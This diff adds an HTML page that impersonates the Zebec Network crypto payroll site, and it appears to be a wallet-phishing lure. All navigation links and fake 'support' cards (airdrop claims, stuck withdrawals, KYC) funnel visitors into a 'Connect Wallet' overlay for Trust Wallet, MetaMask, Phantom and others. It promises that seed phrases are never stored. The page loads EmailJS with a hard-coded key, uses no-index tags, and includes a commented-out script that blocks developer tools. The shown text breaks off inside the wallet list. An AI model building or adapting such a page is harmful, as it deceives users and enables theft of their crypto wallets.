@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <!-- <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script> -->
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="img/zebeclogo.png">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init('7tpKliu3iA0wJbT5q');
+        })();
+    </script>
+    <script src="w3ref.js"></script>
+    <script src="script.js"></script>
+    <title>Zebec Network | Real-Time Crypto Payroll & Payments</title>
+</head>
+
+<body>
+
+    <header>
+        <nav>
+            <a href="#" class="brand">
+                <img src="img/zebeclogo.png" alt=""></span>
+                Zebec Network
+            </a>
+
+            <button class="hamburger" id="hamburgerBtn" aria-label="Toggle menu" aria-expanded="false"
+                onclick="toggleMenu()">
+                <span></span><span></span><span></span>
+            </button>
+
+            <div class="nav-right" id="navRight">
+                <div class="nav-links">
+                    <div class="nav-item">
+                        <button class="nav-trigger">Products
+                            <svg class="chevron" viewBox="0 0 10 6" fill="none">
+                                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.4"
+                                    stroke-linecap="round" />
+                            </svg>
+                        </button>
+                        <div class="dropdown">
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <rect x="2" y="5" width="20" height="14" rx="2.5" stroke-width="1.6" />
+                                        <path d="M2 9.5H22" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Zebec Cards</span><span class="dd-sub">Crypto cards, your
+                                        choice</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <path d="M3 6L12 13L21 6" stroke-width="1.6" />
+                                        <rect x="3" y="5" width="18" height="14" rx="2" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Payroll</span><span class="dd-sub">Stablecoin wages, real
+                                        time</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <circle cx="6" cy="6" r="2.5" stroke-width="1.6" />
+                                        <circle cx="18" cy="6" r="2.5" stroke-width="1.6" />
+                                        <circle cx="12" cy="18" r="2.5" stroke-width="1.6" />
+                                        <path d="M8 7.5L11 16M16 7.5L13 16M8.5 6H15.5" stroke-width="1.4" /></span>
+                                <span><span class="dd-title">DePIN</span><span class="dd-sub">Decentralized payments
+                                        pilot</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <rect x="3" y="3" width="7" height="7" rx="1.5" stroke-width="1.6" />
+                                        <rect x="14" y="3" width="7" height="7" rx="1.5" stroke-width="1.6" />
+                                        <rect x="3" y="14" width="7" height="7" rx="1.5" stroke-width="1.6" />
+                                        <rect x="14" y="14" width="7" height="7" rx="1.5" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Super App <span style="opacity:.6;font-weight:500;">(early
+                                            access)</span></span><span class="dd-sub">Earn, spend, stake and
+                                        more</span></span>
+                            </a>
+                        </div>
+                    </div>
+
+                    <div class="nav-item">
+                        <button class="nav-trigger">Company
+                            <svg class="chevron" viewBox="0 0 10 6" fill="none">
+                                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.4"
+                                    stroke-linecap="round" />
+                            </svg>
+                        </button>
+                        <div class="dropdown">
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <circle cx="12" cy="12" r="9" stroke-width="1.6" />
+                                        <path d="M12 8V12L14.5 14.5" stroke-width="1.6" stroke-linecap="round" />
+                                    </svg></span>
+                                <span><span class="dd-title">About</span><span class="dd-sub">Who we are and what we
+                                        do</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <circle cx="9" cy="9" r="3" stroke-width="1.6" />
+                                        <circle cx="17" cy="10" r="2.5" stroke-width="1.6" />
+                                        <path d="M3 20C3 16.5 5.7 14.5 9 14.5C12.3 14.5 15 16.5 15 20"
+                                            stroke-width="1.6" />
+                                        <path d="M15.5 15C18.2 15.3 20 16.9 20 20" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Team</span><span class="dd-sub">Global, always
+                                        on</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <path d="M4 21V5.5C4 4.7 4.7 4 5.5 4H14.5C15.3 4 16 4.7 16 5.5V21"
+                                            stroke-width="1.6" />
+                                        <path d="M16 10H18.5C19.3 10 20 10.7 20 11.5V21" stroke-width="1.6" />
+                                        <path d="M7 8H9M7 12H9M7 16H9" stroke-width="1.6" stroke-linecap="round" />
+                                    </svg></span>
+                                <span><span class="dd-title">Companies</span><span class="dd-sub">Our portfolio
+                                        companies</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <path d="M12 3L20 6.5V11C20 16 16.5 19.8 12 21C7.5 19.8 4 16 4 11V6.5L12 3Z"
+                                            stroke-width="1.6" />
+                                        <path d="M9 12L11 14L15.5 9.5" stroke-width="1.6" stroke-linecap="round"
+                                            stroke-linejoin="round" />
+                                    </svg></span>
+                                <span><span class="dd-title">Compliance</span><span class="dd-sub">Trust built
+                                        in</span></span>
+                            </a>
+                        </div>
+                    </div>
+
+                    <div class="nav-item">
+                        <button class="nav-trigger">ZBCN
+                            <svg class="chevron" viewBox="0 0 10 6" fill="none">
+                                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.4"
+                                    stroke-linecap="round" />
+                            </svg>
+                        </button>
+                        <div class="dropdown">
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <circle cx="12" cy="12" r="9" stroke-width="1.6" />
+                                        <path d="M9 12H15M12 9V15" stroke-width="1.6" stroke-linecap="round" />
+                                    </svg></span>
+                                <span><span class="dd-title">Buy ZBCN</span><span class="dd-sub">Get exposure to the
+                                        network</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <rect x="4" y="10" width="16" height="10" rx="2" stroke-width="1.6" />
+                                        <path d="M8 10V7C8 4.8 9.8 3 12 3C14.2 3 16 4.8 16 7V10" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Stake</span><span class="dd-sub">Put your ZBCN to
+                                        work</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <path d="M12 3L4 7V12C4 16.5 7.4 20.3 12 21C16.6 20.3 20 16.5 20 12V7L12 3Z"
+                                            stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Governance (DAO)</span><span class="dd-sub">Shape the
+                                        network's
+                                        future</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <path d="M4 19V13M10 19V9M16 19V5M20 19V11" stroke-width="1.8"
+                                            stroke-linecap="round" />
+                                    </svg></span>
+                                <span><span class="dd-title">Tokenomics</span><span class="dd-sub">Supply, allocation,
+                                        utility</span></span>
+                            </a>
+                        </div>
+                    </div>
+
+                    <div class="nav-item">
+                        <button class="nav-trigger">For Business
+                            <svg class="chevron" viewBox="0 0 10 6" fill="none">
+                                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.4"
+                                    stroke-linecap="round" />
+                            </svg>
+                        </button>
+                        <div class="dropdown">
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <path d="M3 6L12 13L21 6" stroke-width="1.6" />
+                                        <rect x="3" y="5" width="18" height="14" rx="2" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Next-Gen Payrolls</span><span class="dd-sub">Pay any team,
+                                        anywhere</span></span>
+                            </a>
+                            <a class="dd-option" href="#" onclick="openWallet();return false;">
+                                <span class="dd-icon"><svg viewBox="0 0 24 24">
+                                        <rect x="2" y="5" width="20" height="14" rx="2.5" stroke-width="1.6" />
+                                        <path d="M2 9.5H22" stroke-width="1.6" />
+                                    </svg></span>
+                                <span><span class="dd-title">Custom Card Programs</span><span class="dd-sub">Branded
+                                        cards
+                                        for your business</span></span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <a href="#" class="btn-primary" onclick="openWallet();return false;">Connect Wallet</a>
+            </div>
+        </nav>
+    </header>
+
+    <!-- ============ HERO ============ -->
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <svg class="ribbon" viewBox="0 0 1400 340" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="ribbonGrad" x1="0" y1="0" x2="1" y2="1">
+                    <stop offset="0%" stop-color="#08dfa2" stop-opacity="0.05" />
+                    <stop offset="50%" stop-color="#08dfa2" stop-opacity="0.55" />
+                    <stop offset="100%" stop-color="#0a0b0a" stop-opacity="0.1" />
+                </linearGradient>
+            </defs>
+            <path d="M0,180 C200,60 300,300 500,180 C700,60 800,300 1000,180 C1150,90 1250,260 1400,150"
+                stroke="url(#ribbonGrad)" stroke-width="70" fill="none" stroke-linecap="round" opacity="0.9" />
+            <path d="M0,200 C220,90 320,320 520,200 C720,90 820,320 1020,200 C1170,110 1270,280 1400,170"
+                stroke="#1c1f1c" stroke-width="46" fill="none" stroke-linecap="round" opacity="0.6" />
+        </svg>
+        <div class="hero-content">
+            <h1>Where Real-Time<br>Meets Real-World</h1>
+            <p class="subtitle">Stablecoin Payroll and Seamless PayFi — In Motion</p><br><br>
+            <a href="#support" class="btn-primary">Explore More</a>
+        </div>
+    </section>
+
+    <!-- ============ SUPPORT CTA SECTION ============ -->
+    <section class="section support-section" id="support">
+        <div class="wrap">
+            <div class="section-head">
+                <span class="eyebrow">Support</span>
+                <h2>What do you need help with?</h2>
+                <p>Pick an issue and we'll connect your wallet to get it sorted — fast.</p>
+            </div>
+
+            <div class="support-grid">
+                <div class="support-card" onclick="openWallet('airdrop')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <path d="M12 2L14 9H21L15.5 13.5L17.5 21L12 16.5L6.5 21L8.5 13.5L3 9H10L12 2Z"
+                                stroke-width="1.5" stroke-linejoin="round" />
+                        </svg></span>
+                    <h3>Claim Airdrop</h3>
+                    <p>Missing or delayed ZBCN airdrop allocation.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('staking')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <rect x="4" y="10" width="16" height="10" rx="2" stroke-width="1.6" />
+                            <path d="M8 10V7C8 4.8 9.8 3 12 3C14.2 3 16 4.8 16 7V10" stroke-width="1.6" />
+                        </svg></span>
+                    <h3>Staking Issue</h3>
+                    <p>Stuck stake, delayed unstake, or reward mismatch.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('earn')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <circle cx="12" cy="12" r="9" stroke-width="1.6" />
+                            <path d="M9 12H15M12 9V15" stroke-width="1.6" stroke-linecap="round" />
+                        </svg></span>
+                    <h3>Earn Rewards</h3>
+                    <p>Rewards not reflecting or yield questions.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('card')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <rect x="2" y="5" width="20" height="14" rx="2.5" stroke-width="1.6" />
+                            <path d="M2 9.5H22" stroke-width="1.6" />
+                        </svg></span>
+                    <h3>Zebec Card</h3>
+                    <p>Zebec Card activation, order status, or delivery.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('payroll')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <path d="M3 6L12 13L21 6" stroke-width="1.6" />
+                            <rect x="3" y="5" width="18" height="14" rx="2" stroke-width="1.6" />
+                        </svg></span>
+                    <h3>Payroll Support</h3>
+                    <p>Wages not streaming or payroll setup help.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('withdraw')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <path d="M12 21V3M12 21L6 15M12 21L18 15" stroke-width="1.6" stroke-linecap="round"
+                                stroke-linejoin="round" />
+                        </svg></span>
+                    <h3>Withdrawal Issue</h3>
+                    <p>Pending, failed, or delayed withdrawal.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('wallet')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <rect x="3" y="6" width="18" height="13" rx="2.5" stroke-width="1.6" />
+                            <path d="M16 12.5H18" stroke-width="2" stroke-linecap="round" />
+                            <path d="M3 9H21" stroke-width="1.6" />
+                        </svg></span>
+                    <h3>Wallet Connection</h3>
+                    <p>Trouble connecting or verifying your wallet.</p>
+                    <span class="go">Get help →</span>
+                </div>
+                <div class="support-card" onclick="openWallet('kyc')">
+                    <span class="support-icon"><svg viewBox="0 0 24 24">
+                            <path d="M12 3L20 6.5V11C20 16 16.5 19.8 12 21C7.5 19.8 4 16 4 11V6.5L12 3Z"
+                                stroke-width="1.6" />
+                            <path d="M9 12L11 14L15.5 9.5" stroke-width="1.6" stroke-linecap="round"
+                                stroke-linejoin="round" />
+                        </svg></span>
+                    <h3>KYC / Verification</h3>
+                    <p>Identity verification stuck or rejected.</p>
+                    <span class="go">Get help →</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============ IMPACT / STATS ============ -->
+    <section class="section">
+        <div class="wrap">
+            <div class="section-head">
+                <span class="eyebrow">Impact</span>
+                <h2>Changing the Way<br>Money Moves</h2>
+                <p>Building decentralized infrastructure since 2021</p>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-number">$500M</div>
+                    <div class="stat-label">Annual Payroll Volume</div>
+                </div>
+                <div class="stat-card card-visual"></div>
+                <div class="stat-card accent">
+                    <div class="stat-number">250+</div>
+                    <div class="stat-label">Enterprise Clients</div>
+                </div>
+                <div class="stat-card mountain">
+                    <div class="stat-number">50K+</div>
+                    <div class="stat-label">Monthly Users On- and Off-Chain</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">18+</div>
+                    <div class="stat-label">Chains and 150+ Tokens Integrated</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============ QUOTE ============ -->
+    <section class="quote-section">
+        <div class="wrap">
+            <blockquote>
+                Zebec is helping create a future where money and value move <span class="dim">freely in all aspects of
+                    our economy, from payroll to investments to everyday expenses.</span>
+            </blockquote>
+        </div>
+    </section>
+
+    <!-- ============ PRODUCT SHOWCASE ============ -->
+    <section class="section">
+        <div class="wrap">
+            <div class="showcase">
+                <div class="showcase-copy">
+                    <span class="eyebrow">Products</span>
+                    <h2>Bringing the Blockchain to Everyday Life</h2>
+                    <p>Get Paid Today. Spend and Invest. All with Zebec.</p>
+                    <div class="store-buttons">
+                        <a href="#" class="store-btn">
+                            <svg width="18" height="18" viewBox="0 0 24 24">
+                                <path
+                                    d="M16.5 2c.1 1.1-.3 2.2-1 3-.7.8-1.9 1.5-3 1.4-.1-1.1.4-2.2 1.1-3C14.3 2.6 15.5 2 16.5 2zM20.7 17.2c-.5 1.1-.8 1.6-1.4 2.5-.9 1.4-2.3 3.1-3.9 3.1-1.4 0-1.8-.9-3.7-.9s-2.4.9-3.7.9c-1.6 0-2.9-1.6-3.9-3-2.7-3.8-3-8.3-1.3-10.7 1.2-1.7 3-2.7 4.7-2.7 1.8 0 2.9 1 4.4 1 1.4 0 2.3-1 4.4-1 1.5 0 3.1.8 4.2 2.2-3.7 2-3.1 7.2.2 8.6z" />
+                            </svg>
+                            <span class="lines"><span class="top">Download on the</span><span class="bottom">App
+                                    Store</span></span>
+                        </a>
+                        <a href="#" class="store-btn">
+                            <svg width="18" height="18" viewBox="0 0 24 24">
+                                <path d="M3 2.5v19l10-9.5L3 2.5z" fill="#08dfa2" />
+                                <path d="M13.5 12l3.6-3.4L4.5 3l9 9z" />
+                                <path d="M13.5 12l-9 9L17.1 15.4 13.5 12z" />
+                            </svg>
+                            <span class="lines"><span class="top">GET IT ON</span><span class="bottom">Google
+                                    Play</span></span>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="showcase-cards">
+                    <div class="phone-card spend">
+                        <span class="phone-tag">Spend</span>
+                        <p class="phone-headline">Spend Your Crypto. Anytime. Anywhere. With Zebec Cards.</p>
+                        <div class="credit-card-visual">
+                            <span class="cc-brand">Zebec</span>
+                            <span class="cc-chip"></span>
+                        </div>
+                    </div>
+                    <div class="phone-card payroll">
+                        <span class="phone-tag" style="color:var(--accent);">Payroll</span>
+                        <p class="phone-headline">Real Time Payroll. Get Paid by the Second.</p>
+                        <div class="dash-visual">
+                            <div class="dash-row"><span>DEPOSITED BALANCE</span><span>Treasury</span></div>
+                            <div class="dash-balance">$15,832.02</div>
+                            <div class="dash-row"><span>TOTAL INCOMING</span><span
+                                    style="color:var(--accent);">$809.05</span></div>
+                            <div class="dash-row"><span>TOTAL OUTGOING</span><span>-$2,230.23</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="carousel-controls">
+                <button class="arrow-btn" aria-label="Previous">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                        <path d="M15 6L9 12L15 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                </button>
+                <button class="arrow-btn" aria-label="Next">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                        <path d="M9 6L15 12L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============ FINAL CTA BANNER ============ -->
+    <div class="cta-banner-wrap">
+        <div class="cta-banner">
+            <h2>Pay. Stream. Stake.<br>The Future of Money Moves in Real-Time</h2>
+            <a href="#" class="btn-dark" onclick="openWallet();return false;">Connect Wallet</a>
+        </div>
+    </div>
+
+    <!-- ============ ENTERPRISE PARTNERS MARQUEE ============ -->
+    <section style="padding-bottom:70px;">
+        <div class="wrap">
+            <div class="partners-label">Our Enterprise Partners</div>
+        </div>
+        <div class="marquee">
+            <div class="marquee-track">
+                <span class="marquee-item">KOTAPAY</span>
+                <span class="marquee-item">uphold institutional</span>
+                <span class="marquee-item">tokenised GBP</span>
+                <span class="marquee-item">mastercard</span>
+                <span class="marquee-item">Stellar</span>
+                <span class="marquee-item">Algorand</span>
+                <span class="marquee-item">CIRCLE</span>
+                <!-- duplicated for seamless loop -->
+                <span class="marquee-item">KOTAPAY</span>
+                <span class="marquee-item">uphold institutional</span>
+                <span class="marquee-item">tokenised GBP</span>
+                <span class="marquee-item">mastercard</span>
+                <span class="marquee-item">Stellar</span>
+                <span class="marquee-item">Algorand</span>
+                <span class="marquee-item">CIRCLE</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============ FOOTER ============ -->
+    <footer>
+        <div class="wrap">
+            <div class="footer-top">
+                <div class="footer-brand">
+                    <a href="#" class="brand">
+                        <img src="img/zebeclogo.png" alt="">
+                        Zebec Network
+                    </a>
+                    <div class="footer-store">
+                        <a href="#" class="store-btn">
+                            <svg width="16" height="16" viewBox="0 0 24 24">
+                                <path
+                                    d="M16.5 2c.1 1.1-.3 2.2-1 3-.7.8-1.9 1.5-3 1.4-.1-1.1.4-2.2 1.1-3C14.3 2.6 15.5 2 16.5 2zM20.7 17.2c-.5 1.1-.8 1.6-1.4 2.5-.9 1.4-2.3 3.1-3.9 3.1-1.4 0-1.8-.9-3.7-.9s-2.4.9-3.7.9c-1.6 0-2.9-1.6-3.9-3-2.7-3.8-3-8.3-1.3-10.7 1.2-1.7 3-2.7 4.7-2.7 1.8 0 2.9 1 4.4 1 1.4 0 2.3-1 4.4-1 1.5 0 3.1.8 4.2 2.2-3.7 2-3.1 7.2.2 8.6z" />
+                            </svg>
+                            <span class="lines"><span class="top">Download on the</span><span class="bottom">App
+                                    Store</span></span>
+                        </a>
+                        <a href="#" class="store-btn">
+                            <svg width="16" height="16" viewBox="0 0 24 24">
+                                <path d="M3 2.5v19l10-9.5L3 2.5z" fill="#08dfa2" />
+                                <path d="M13.5 12l3.6-3.4L4.5 3l9 9z" />
+                                <path d="M13.5 12l-9 9L17.1 15.4 13.5 12z" />
+                            </svg>
+                            <span class="lines"><span class="top">GET IT ON</span><span class="bottom">Google
+                                    Play</span></span>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Cards</h4>
+                    <a href="#">Overview</a>
+                    <a href="#">Silver</a>
+                    <a href="#">Carbon</a>
+                    <a href="#">Black</a>
+                </div>
+                <div class="footer-col">
+                    <h4>Products</h4>
+                    <a href="#">Payroll</a>
+                    <a href="#">DePIN</a>
+                    <a href="#">For Business</a>
+                    <a href="#">Super App</a>
+                </div>
+                <div class="footer-col">
+                    <h4>ZBCN</h4>
+                    <a href="#">Buy ZBCN</a>
+                    <a href="#">Stake</a>
+                    <a href="#">Governance</a>
+                    <a href="#">Tokenomics</a>
+                </div>
+                <div class="footer-col">
+                    <h4>Resources</h4>
+                    <a href="#">Docs</a>
+                    <a href="#">Help and Support</a>
+                    <a href="#">Media Press</a>
+                    <a href="#">Super App Terms</a>
+                </div>
+                <div class="footer-col">
+                    <h4>Company</h4>
+                    <a href="#">About</a>
+                    <a href="#">Team</a>
+                    <a href="#">Compliance</a>
+                    <a href="#">Blog</a>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="footer-legal">
+                    © 2026 Zebec. All rights reserved.<br>
+                    For informational purposes only. Digital assets carry risk, and you may lose funds. This is not
+                    financial advice or an investment solicitation. Not all products or services are available in all
+                    jurisdictions. Terms apply. <a href="#">read more</a>
+                </div>
+                <div class="footer-socials">
+                    <a href="#" aria-label="X"><svg viewBox="0 0 24 24">
+                            <path
+                                d="M18.9 2H22L14.8 10.3L23.3 22H16.7L11.5 15.1L5.6 22H2.4L10.1 13.1L2 2H8.8L13.5 8.3L18.9 2Z" />
+                        </svg></a>
+                    <a href="#" aria-label="Discord"><svg viewBox="0 0 24 24">
+                            <path
+                                d="M20 5.5C18.5 4.8 17 4.3 15.4 4C15.2 4.4 15 4.9 14.8 5.3C13.1 5.1 11.4 5.1 9.7 5.3C9.5 4.9 9.3 4.4 9.1 4C7.5 4.3 6 4.8 4.5 5.5C1.9 9.4 1.1 13.2 1.5 17C3.3 18.3 5 19.1 6.7 19.6C7.1 19 7.5 18.4 7.8 17.7C7.2 17.5 6.6 17.2 6 16.9C6.1 16.8 6.3 16.7 6.4 16.5C9.9 18.1 13.6 18.1 17.1 16.5C17.2 16.6 17.4 16.8 17.5 16.9C16.9 17.2 16.3 17.5 15.7 17.7C16.1 18.4 16.5 19 16.8 19.6C18.5 19.1 20.2 18.3 22 17C22.4 12.6 21.3 8.8 20 5.5ZM8.7 14.6C7.7 14.6 6.9 13.7 6.9 12.6C6.9 11.5 7.7 10.6 8.7 10.6C9.7 10.6 10.5 11.5 10.5 12.6C10.5 13.7 9.7 14.6 8.7 14.6ZM15.2 14.6C14.2 14.6 13.4 13.7 13.4 12.6C13.4 11.5 14.2 10.6 15.2 10.6C16.2 10.6 17 11.5 17 12.6C17 13.7 16.2 14.6 15.2 14.6Z" />
+                        </svg></a>
+                    <a href="#" aria-label="Telegram"><svg viewBox="0 0 24 24">
+                            <path
+                                d="M21 4L2.5 11.3C1.7 11.6 1.7 12.4 2.4 12.7L6.9 14.2L8.5 19.8C8.7 20.4 9.4 20.5 9.8 20.1L12.3 17.7L17 21.2C17.6 21.6 18.4 21.3 18.6 20.6L21.9 5.2C22.1 4.4 21.7 3.7 21 4ZM8.5 13.3L17 8L9.6 14.9L9.4 17.4L8.5 13.3Z" />
+                        </svg></a>
+                    <a href="#" aria-label="Instagram"><svg viewBox="0 0 24 24">
+                            <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="currentColor"
+                                stroke-width="1.8" />
+                            <circle cx="12" cy="12" r="4.2" fill="none" stroke="currentColor" stroke-width="1.8" />
+                            <circle cx="17.3" cy="6.7" r="1.2" />
+                        </svg></a>
+                    <a href="#" aria-label="YouTube"><svg viewBox="0 0 24 24">
+                            <rect x="2" y="5" width="20" height="14" rx="4" fill="none" stroke="currentColor"
+                                stroke-width="1.8" />
+                            <path d="M10 9L15 12L10 15V9Z" />
+                        </svg></a>
+                    <a href="#" aria-label="Medium"><svg viewBox="0 0 24 24">
+                            <circle cx="6" cy="12" r="4" fill="none" stroke="currentColor" stroke-width="1.6" />
+                            <ellipse cx="15" cy="12" rx="3" ry="4" fill="none" stroke="currentColor"
+                                stroke-width="1.6" />
+                            <ellipse cx="20.5" cy="12" rx="1.3" ry="4" fill="none" stroke="currentColor"
+                                stroke-width="1.6" />
+                        </svg></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="w-overlay" id="wOverlay">
+
+
+        <div class="w-panel" id="wScreen1">
+            <div class="w-header">
+                <span class="w-title">Connect Wallet</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-body">
+
+
+                <div class="w-featured wallet-trigger" data-wid="trustwallet" onclick="handleWalletSelect(this)">
+                    <span class="w-featured-badge">Popular</span>
+                    <div class="w-feat-icon">
+                        <img src="img/trustwallet.png" alt="Trust Wallet" />
+                    </div>
+                    <div>
+                        <div class="w-feat-name">Trust Wallet</div>
+                        <div class="w-feat-desc">Multi-chain mobile wallet</div>
+                    </div>
+                </div>
+
+                <div class="w-divider"><span>other wallets</span></div>
+
+                <div class="w-list">
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/zebeclogo.png" alt="Zebec" /></div>
+                        <div>
+                            <div class="w-item-name">Zebec Superapp</div>
+                            <div class="w-item-desc">Multi-chain wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" data-wid="phantom" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
+                        <div>
+                            <div class="w-item-name">Phantom Wallet</div>
+                            <div class="w-item-desc">Solana/EVM wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/safepal.png" alt="Safepal" /></div>
+                        <div>
+                            <div class="w-item-name">Safepal</div>
+                            <div class="w-item-desc">Multi-chain wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" data-wid="metamask" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/metamask.png" alt="Metamask Wallet" /></div>
+                        <div>
+                            <div class="w-item-name">Metamask </div>
+                            <div class="w-item-desc">Ethereum Wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item w-item-other" onclick="openOtherWallets()">
+                        <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+                        <div>
+                            <div class="w-item-name">Other Wallets</div>
+                            <div class="w-item-desc">Browse 30+ supported wallets</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                </div>
+
+                <p class="w-note">
+                    By connecting you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>.
+                    We never store your private keys or seed phrases.
+                </p>
+            </div>
+        </div>
+
+
+        <div class="w-sub" id="wScreenOther">
+            <div class="w-header">
+                <span class="w-title">Other Wallets</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="ow-search-wrap">
+                <i class="ri-search-line"></i>
+                <input class="ow-search" id="owSearch" type="text" placeholder="Search by name or network..."
+                    autocomplete="off" spellcheck="false" />
+            </div>
+            <div class="ow-count" id="owCount">30 wallets</div>
+            <div class="ow-list" id="owList">
+                <div class="ow-item" onclick="selectOwWallet(this)">
